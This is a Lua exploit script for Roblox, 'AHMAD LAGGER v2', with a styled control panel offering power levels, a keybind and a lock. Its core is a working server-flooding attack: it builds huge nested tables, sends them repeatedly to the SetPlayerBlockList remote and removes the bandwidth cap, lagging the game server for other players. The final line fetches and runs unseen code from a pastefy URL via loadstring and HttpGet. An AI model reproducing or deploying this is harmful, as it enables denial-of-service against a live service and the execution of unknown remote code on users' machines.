--// AHMAD LAGGER v2
--// UI refaite : header propre, barre de niveaux, gros toggle, footer avec KEY / LOCK / STATUS
--// Keybind par defaut : M (clique sur la case KEY en bas a gauche pour changer)

local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local CoreGui          = game:GetService("CoreGui")
local HttpService      = game:GetService("HttpService")
local RunService       = game:GetService("RunService")
local Stats            = game:GetService("Stats")

local LP        = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")
local ConfigFile = "AhmadLaggerConfig.json"

-- ⚙️ POWER
local NIVELES = {
    Low   = { poder = 23 },
    Mid   = { poder = 32 },
    High  = { poder = 70 },
    Ultra = { poder = 90 },
}
local ORDER = { "Low", "Mid", "High", "Ultra" }

local keybind           = Enum.KeyCode.M
local listeningForInput = false
local laggerActive      = false
local lagThread         = nil
local nivelActual       = "Low"
local ventanaBloqueada  = false
local minimized         = false

-- 🎨 CRYSTAL PALETTE (modifiée pour s'accorder avec le vert)
local C = {
    BG         = Color3.fromRGB(20, 80, 30),      -- vert forêt
    Row        = Color3.fromRGB(30, 100, 40),
    Card       = Color3.fromRGB(40, 120, 50),
    Violet     = Color3.fromRGB(60, 200, 80),     -- remplace le violet par un vert clair
    VioletDeep = Color3.fromRGB(20, 100, 30),
    Rose       = Color3.fromRGB(200, 255, 150),   -- vert pomme
    RoseSoft   = Color3.fromRGB(150, 255, 120),
    Text       = Color3.fromRGB(255, 255, 255),
    TextDim    = Color3.fromRGB(200, 255, 180),
    Stroke     = Color3.fromRGB(100, 255, 100),
    Dark       = Color3.fromRGB(10, 50, 15),
    Off        = Color3.fromRGB(40, 100, 50),
    BlueFX     = Color3.fromRGB(100, 255, 200),
    Green      = Color3.fromRGB(100, 255, 150),
    Yellow     = Color3.fromRGB(255, 240, 100),
    Red        = Color3.fromRGB(255, 100, 100),
}

-- 🧩 HELPERS
local function corner(p, r)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 10); c.Parent = p; return c
end

local function stroke(p, col, th, tr)
    local s = Instance.new("UIStroke")
    s.Color = col or C.Stroke; s.Thickness = th or 1.2
    s.Transparency = tr or 0.35; s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = p; return s
end

local function shineStroke(obj)
    local s = stroke(obj, C.Rose, 1.4, 0.3)
    task.spawn(function()
        local t = 0
        while s and s.Parent do
            t = t + 0.05
            s.Transparency = 0.2 + math.sin(t * 1.6) * 0.18
            if math.sin(t * 0.8) > 0.7 then s.Color = C.BlueFX else s.Color = C.Rose end
            task.wait(0.04)
        end
    end)
    return s
end

local function highlight(obj, col)
    local g = Instance.new("UIGradient", obj)
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, col or C.Violet),
        ColorSequenceKeypoint.new(0.5, C.Rose),
        ColorSequenceKeypoint.new(1, col or C.Violet),
    })
    g.Rotation = 25
    task.spawn(function()
        while g and g.Parent do
            g.Offset = Vector2.new((tick() * 0.35) % 2 - 1, 0)
            task.wait(0.03)
        end
    end)
    return g
end

local function hoverLift(btn, base)
    base = base or 0.15
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = math.max(0, base - 0.15) }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = base }):Play()
    end)
    btn.MouseButton1Down:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.08), { Size = btn.Size - UDim2.new(0, 2, 0, 2) }):Play()
    end)
end

-- 💾 CONFIG
local function SaveConfig()
    local data = { Nivel = nivelActual, Bloqueado = ventanaBloqueada, Key = keybind.Name }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
            if data.Key and Enum.KeyCode[data.Key] then keybind = Enum.KeyCode[data.Key] end
        end)
    end
end
LoadConfig()

-- ⚠️ LAG ENGINE (pre-build = moins de freeze cote client)
local cachedBomb, cachedPower = nil, nil

local function buildBomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {}; table.insert(z, t); z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    return main
end

local function fireBomb()
    if not cachedBomb or cachedPower ~= NIVELES[nivelActual].poder then
        cachedPower = NIVELES[nivelActual].poder
        cachedBomb  = buildBomb(cachedPower)
    end
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(cachedBomb)
    end)
end

-- 🖼️ UI
if CoreGui:FindFirstChild("AhmadLagger") then CoreGui.AhmadLagger:Destroy() end
if PlayerGui:FindFirstChild("AhmadLagger") then PlayerGui.AhmadLagger:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AhmadLagger"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 50
pcall(function() if syn and syn.protect_gui then syn.protect_gui(screenGui) end end)
local ok = pcall(function() screenGui.Parent = CoreGui end)
if not ok then screenGui.Parent = PlayerGui end

local W, H = 286, 178

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, W, 0, H)
mainFrame.Position = UDim2.new(0.14, 0, 0.5, -H/2)
mainFrame.BackgroundColor3 = C.BG
mainFrame.BackgroundTransparency = 0.08
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Active = true
corner(mainFrame, 16)

-- 🌿 NOUVEAU BACKGROUND VERT AVEC DÉCORATIONS DE FEUILLES
-- On supprime l'ancien background (bgImg et bgTint) et on le remplace

-- Fond vert avec un dégradé doux
local bgGreen = Instance.new("Frame", mainFrame)
bgGreen.Size = UDim2.new(1, 0, 1, 0)
bgGreen.BackgroundColor3 = Color3.fromRGB(30, 120, 40)
bgGreen.BackgroundTransparency = 0.1
bgGreen.BorderSizePixel = 0
bgGreen.ZIndex = 0
corner(bgGreen, 16)

-- Dégradé pour donner de la profondeur
local grad = Instance.new("UIGradient", bgGreen)
grad.Rotation = 45
grad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 80, 30)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 160, 60)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 80, 30)),
})

-- Quelques feuilles dispersées (utilisation d'IDs d'images de feuilles Roblox)
local leafIds = {
    "rbxassetid://147136575",  -- feuille (maple?)
    "rbxassetid://562104406",  -- autre feuille
    "rbxassetid://6151917382", -- plante
}
for i = 1, 14 do
    local leaf = Instance.new("ImageLabel", bgGreen)
    local size = 20 + math.random() * 30
    leaf.Size = UDim2.new(0, size, 0, size)
    leaf.Position = UDim2.new(math.random(), 0, math.random(), 0)
    leaf.BackgroundTransparency = 1
    leaf.Image = leafIds[math.random(#leafIds)]
    leaf.ImageTransparency = 0.2 + math.random() * 0.3
    leaf.Rotation = math.random(-80, 80)
    leaf.ZIndex = 0
    -- petit effet de brillance
    local s = stroke(leaf, Color3.fromRGB(150, 255, 150), 0.5, 0.6)
    s.Transparency = 0.7
    corner(leaf, 99)
    -- animation de légère rotation
    task.spawn(function()
        while leaf and leaf.Parent do
            leaf.Rotation = leaf.Rotation + 0.1
            task.wait(0.1)
        end
    end)
end

-- ═══ HEADER ═══
local header = Instance.new("Frame", mainFrame)
header.Size = UDim2.new(1, 0, 0, 48)
header.BackgroundTransparency = 1
header.ZIndex = 3

local av = Instance.new("ImageLabel", header)
av.Size = UDim2.new(0, 30, 0, 30)
av.Position = UDim2.new(0, 12, 0, 9)
av.BackgroundColor3 = C.VioletDeep
av.Image = "rbxthumb://type=AvatarHeadShot&id=" .. LP.UserId .. "&w=150&h=150"
av.ScaleType = Enum.ScaleType.Crop
av.ZIndex = 3
corner(av, 9); stroke(av, C.Rose, 1, 0.4)

local title = Instance.new("TextLabel", header)
title.BackgroundTransparency = 1
title.Position = UDim2.new(0, 50, 0, 8)
title.Size = UDim2.new(0, 180, 0, 19)
title.Font = Enum.Font.GothamBlack
title.Text = "AHMAD LAGGER"
title.TextColor3 = Color3.fromRGB(200, 255, 180) -- vert clair
title.TextSize = 18
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 3
highlight(title, Color3.fromRGB(100, 255, 100))

local subtitle = Instance.new("TextLabel", header)
subtitle.BackgroundTransparency = 1
subtitle.Position = UDim2.new(0, 50, 0, 26)
subtitle.Size = UDim2.new(0, 170, 0, 12)
subtitle.Font = Enum.Font.GothamBold
subtitle.Text = "lagger module"
subtitle.TextColor3 = C.TextDim
subtitle.TextSize = 10
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.ZIndex = 3

-- bouton minimize (haut droite)
local minBtn = Instance.new("TextButton", header)
minBtn.Size = UDim2.new(0, 22, 0, 22)
minBtn.Position = UDim2.new(1, -34, 0, 13)
minBtn.BackgroundColor3 = C.Card
minBtn.BackgroundTransparency = 0.15
minBtn.Font = Enum.Font.GothamBlack
minBtn.Text = "–"
minBtn.TextSize = 14
minBtn.TextColor3 = C.TextDim
minBtn.AutoButtonColor = false
minBtn.ZIndex = 4
corner(minBtn, 7); stroke(minBtn, C.Rose, 1, 0.55); hoverLift(minBtn)

local sep = Instance.new("Frame", mainFrame)
sep.Size = UDim2.new(1, -28, 0, 1)
sep.Position = UDim2.new(0, 14, 0, 48)
sep.BorderSizePixel = 0
sep.BackgroundColor3 = C.Rose
sep.ZIndex = 3
local sepG = Instance.new("UIGradient", sep)
sepG.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, C.Violet),
    ColorSequenceKeypoint.new(0.5, C.Rose),
    ColorSequenceKeypoint.new(1, C.BlueFX),
})
sepG.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5, 0.05), NumberSequenceKeypoint.new(1, 1),
})
task.spawn(function()
    while sepG and sepG.Parent do
        sepG.Offset = Vector2.new((tick() * 0.4) % 2 - 1, 0)
        task.wait(0.03)
    end
end)

-- ═══ ROW LAGGER + TOGGLE ═══
local row = Instance.new("Frame", mainFrame)
row.Position = UDim2.new(0, 12, 0, 58)
row.Size = UDim2.new(1, -24, 0, 34)
row.BackgroundColor3 = C.Row
row.BackgroundTransparency = 0.25
row.BorderSizePixel = 0
row.ZIndex = 2
corner(row, 10); stroke(row, C.Violet, 1, 0.6)

local textLagger = Instance.new("TextLabel", row)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0, 12, 0, 0)
textLagger.Size = UDim2.new(0, 110, 1, 0)
textLagger.Font = Enum.Font.GothamBlack
textLagger.Text = "LAGGER"
textLagger.TextColor3 = C.Text
textLagger.TextSize = 13
textLagger.TextXAlignment = Enum.TextXAlignment.Left
textLagger.ZIndex = 3

local powerLabel = Instance.new("TextLabel", row)
powerLabel.BackgroundTransparency = 1
powerLabel.Position = UDim2.new(0, 12, 0, 0)
powerLabel.Size = UDim2.new(1, -100, 1, 0)
powerLabel.Font = Enum.Font.GothamBold
powerLabel.Text = "POWER 23"
powerLabel.TextColor3 = C.TextDim
powerLabel.TextSize = 9
powerLabel.TextXAlignment = Enum.TextXAlignment.Right
powerLabel.ZIndex = 3

local toggleContainer = Instance.new("Frame", row)
toggleContainer.BackgroundColor3 = C.Off
toggleContainer.Position = UDim2.new(1, -78, 0.5, -11)
toggleContainer.Size = UDim2.new(0, 68, 0, 22)
toggleContainer.BorderSizePixel = 0
toggleContainer.ZIndex = 3
corner(toggleContainer, 99); stroke(toggleContainer, C.Rose, 1, 0.5)

local toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = C.RoseSoft
toggleBall.Size = UDim2.new(0, 18, 0, 18)
toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
toggleBall.BorderSizePixel = 0
toggleBall.ZIndex = 4
corner(toggleBall, 99)

local toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 1
toggleClick.Size = UDim2.new(1, 0, 1, 0)
toggleClick.ZIndex = 5
toggleClick.Font = Enum.Font.GothamBlack
toggleClick.Text = "OFF"
toggleClick.TextSize = 9
toggleClick.TextColor3 = C.Red
toggleClick.AutoButtonColor = false

-- ═══ BARRE DE NIVEAUX ═══
local levelBar = Instance.new("Frame", mainFrame)
levelBar.Position = UDim2.new(0, 12, 0, 98)
levelBar.Size = UDim2.new(1, -24, 0, 30)
levelBar.BackgroundColor3 = C.Row
levelBar.BackgroundTransparency = 0.3
levelBar.BorderSizePixel = 0
levelBar.ZIndex = 2
corner(levelBar, 10); stroke(levelBar, C.Violet, 1, 0.6)

local pad = Instance.new("UIPadding", levelBar)
pad.PaddingLeft = UDim.new(0, 4); pad.PaddingRight = UDim.new(0, 4)
pad.PaddingTop = UDim.new(0, 4); pad.PaddingBottom = UDim.new(0, 4)
local grid = Instance.new("UIListLayout", levelBar)
grid.FillDirection = Enum.FillDirection.Horizontal
grid.Padding = UDim.new(0, 4)
grid.HorizontalAlignment = Enum.HorizontalAlignment.Center

local btns, strokes = {}, {}
for _, name in ipairs(ORDER) do
    local b = Instance.new("TextButton", levelBar)
    b.Size = UDim2.new(0.25, -4, 1, 0)
    b.BackgroundColor3 = C.Card
    b.BackgroundTransparency = 0.15
    b.Font = Enum.Font.GothamBlack
    b.Text = name:upper()
    b.TextSize = 10
    b.TextColor3 = C.TextDim
    b.AutoButtonColor = false
    b.BorderSizePixel = 0
    b.ZIndex = 3
    corner(b, 8)
    hoverLift(b)
    btns[name] = b
    strokes[name] = stroke(b, C.Violet, 1, 0.6)
end

-- ═══ FOOTER : KEY / LOCK / STATUS ═══
local footer = Instance.new("Frame", mainFrame)
footer.Position = UDim2.new(0, 12, 1, -42)
footer.Size = UDim2.new(1, -24, 0, 30)
footer.BackgroundColor3 = C.Row
footer.BackgroundTransparency = 0.3
footer.BorderSizePixel = 0
footer.ZIndex = 2
corner(footer, 10); stroke(footer, C.Rose, 1, 0.6)

local keybindButton = Instance.new("TextButton", footer)
keybindButton.Position = UDim2.new(0, 5, 0.5, -10)
keybindButton.Size = UDim2.new(0, 74, 0, 20)
keybindButton.BackgroundColor3 = C.Card
keybindButton.BackgroundTransparency = 0.15
keybindButton.Font = Enum.Font.GothamBold
keybindButton.Text = "KEY: M"
keybindButton.TextColor3 = C.TextDim
keybindButton.TextSize = 10
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 3
corner(keybindButton, 7); stroke(keybindButton, C.Rose, 1, 0.55); hoverLift(keybindButton)

local lockButton = Instance.new("TextButton", footer)
lockButton.Position = UDim2.new(0, 84, 0.5, -10)
lockButton.Size = UDim2.new(0, 64, 0, 20)
lockButton.BackgroundColor3 = C.Card
lockButton.BackgroundTransparency = 0.15
lockButton.Font = Enum.Font.GothamBold
lockButton.TextSize = 10
lockButton.TextColor3 = C.TextDim
lockButton.AutoButtonColor = false
lockButton.ZIndex = 3
corner(lockButton, 7); stroke(lockButton, C.Rose, 1, 0.55); hoverLift(lockButton)

local statusDot = Instance.new("Frame", footer)
statusDot.Size = UDim2.new(0, 8, 0, 8)
statusDot.Position = UDim2.new(1, -76, 0.5, -4)
statusDot.BackgroundColor3 = C.Red
statusDot.BorderSizePixel = 0
statusDot.ZIndex = 3
corner(statusDot, 99)
task.spawn(function()
    local t = 0
    while statusDot and statusDot.Parent do
        t = t + 0.06
        statusDot.BackgroundTransparency = 0.15 + math.sin(t * 3) * 0.3
        task.wait(0.05)
    end
end)

local pingLabel = Instance.new("TextLabel", footer)
pingLabel.BackgroundTransparency = 1
pingLabel.Position = UDim2.new(1, -64, 0.5, -8)
pingLabel.Size = UDim2.new(0, 60, 0, 16)
pingLabel.Font = Enum.Font.GothamBold
pingLabel.Text = "0 ms"
pingLabel.TextColor3 = C.TextDim
pingLabel.TextSize = 10
pingLabel.TextXAlignment = Enum.TextXAlignment.Right
pingLabel.ZIndex = 3

task.spawn(function()
    while pingLabel and pingLabel.Parent do
        local ping = 0
        pcall(function()
            ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        end)
        pingLabel.Text = ping .. " ms"
        pingLabel.TextColor3 = ping > 400 and C.Red or (ping > 150 and C.Yellow or C.Green)
        task.wait(1)
    end
end)

local tryhardText = Instance.new("TextLabel", mainFrame)
tryhardText.BackgroundTransparency = 1
tryhardText.Position = UDim2.new(0, 14, 0, 131)
tryhardText.Size = UDim2.new(1, -28, 0, 12)
tryhardText.Font = Enum.Font.GothamBold
tryhardText.Text = "only for tryhards"
tryhardText.TextColor3 = C.RoseSoft
tryhardText.TextSize = 9
tryhardText.TextXAlignment = Enum.TextXAlignment.Center
tryhardText.ZIndex = 3
tryhardText.Visible = false

-- ═══ UPDATES ═══
local levelColors = { Low = C.Green, Mid = C.Yellow, High = C.Red, Ultra = C.Violet }

local function actualizarBotonesNivel()
    for _, name in ipairs(ORDER) do
        local b, s = btns[name], strokes[name]
        if name == nivelActual then
            TweenService:Create(b, TweenInfo.new(0.18), {
                BackgroundColor3 = levelColors[name], BackgroundTransparency = 0.05
            }):Play()
            b.TextColor3 = (name == "High" or name == "Ultra") and C.Text or C.Dark
            s.Color = levelColors[name]; s.Transparency = 0.1
        else
            TweenService:Create(b, TweenInfo.new(0.18), {
                BackgroundColor3 = C.Card, BackgroundTransparency = 0.15
            }):Play()
            b.TextColor3 = C.TextDim
            s.Color = C.Violet; s.Transparency = 0.6
        end
    end
    tryhardText.Visible = (nivelActual == "Ultra")
    powerLabel.Text = "POWER " .. NIVELES[nivelActual].poder
    cachedBomb = nil -- force rebuild avec le nouveau power
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "LOCKED" or "UNLOCK"
    lockButton.TextColor3 = ventanaBloqueada and C.RoseSoft or C.TextDim
end

local function actualizarKeybindButton()
    keybindButton.Text = "KEY: " .. keybind.Name:gsub("Button", "")
end

local function toggleLagger()
    laggerActive = not laggerActive
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = laggerActive and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
        BackgroundColor3 = laggerActive and C.BlueFX or C.RoseSoft,
    }):Play()
    TweenService:Create(toggleContainer, TweenInfo.new(0.2), {
        BackgroundColor3 = laggerActive and C.VioletDeep or C.Off,
    }):Play()

    toggleClick.Text = laggerActive and "ON" or "OFF"
    toggleClick.TextColor3 = laggerActive and C.Green or C.Red
    statusDot.BackgroundColor3 = laggerActive and C.Green or C.Red

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
            while laggerActive do
                fireBomb()
                task.wait(0.18)
            end
            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
        pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
    end
end

toggleClick.MouseButton1Click:Connect(toggleLagger)
for _, name in ipairs(ORDER) do
    btns[name].MouseButton1Click:Connect(function()
        nivelActual = name; actualizarBotonesNivel(); SaveConfig()
    end)
end
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado(); SaveConfig()
end)
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "PRESS..."
    keybindButton.BackgroundColor3 = C.Rose
    keybindButton.TextColor3 = C.Text
end)

-- MINIMIZE
minBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    minBtn.Text = minimized and "+" or "–"
    TweenService:Create(mainFrame, TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Size = minimized and UDim2.new(0, W, 0, 48) or UDim2.new(0, W, 0, H)
    }):Play()
end)

actualizarKeybindButton()
actualizarCandado()
actualizarBotonesNivel()

-- ═══ INPUT ═══
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if listeningForInput then
        if input.KeyCode ~= Enum.KeyCode.Unknown then
            keybind = input.KeyCode
            listeningForInput = false
            actualizarKeybindButton()
            keybindButton.BackgroundColor3 = C.Card
            keybindButton.TextColor3 = C.TextDim
            SaveConfig()
        end
        return
    end
    if input.KeyCode == keybind then toggleLagger() end
end)

-- ═══ DRAG (uniquement via le header) ═══
local isDragging, dragStart, startPos = false, nil, nil
header.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true; dragStart = input.Position; startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- ═══ OPEN ANIMATION ═══
mainFrame.Size = UDim2.new(0, W, 0, 0)
TweenService:Create(mainFrame, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, W, 0, H)
}):Play()

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()